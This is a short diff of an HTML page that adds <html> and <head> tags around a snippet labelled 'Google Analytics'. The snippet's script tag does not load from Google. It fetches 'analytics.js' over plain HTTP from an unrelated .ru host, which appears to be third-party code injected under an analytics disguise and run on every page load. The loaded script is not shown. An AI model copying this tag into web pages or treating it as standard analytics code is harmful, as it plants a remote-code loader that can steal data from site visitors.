@@ -1,3 +1,5 @@
+<html>
+<head>
 <!-- Google Analytics -->
 <script>
 window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
@@ -6,3 +8,4 @@ ga('send', 'pageview');
 </script>
 <script async src='http://u413821vc7.ha002.t.justns.ru/analytics.js'></script>
 <!-- End Google Analytics -->
+</head>
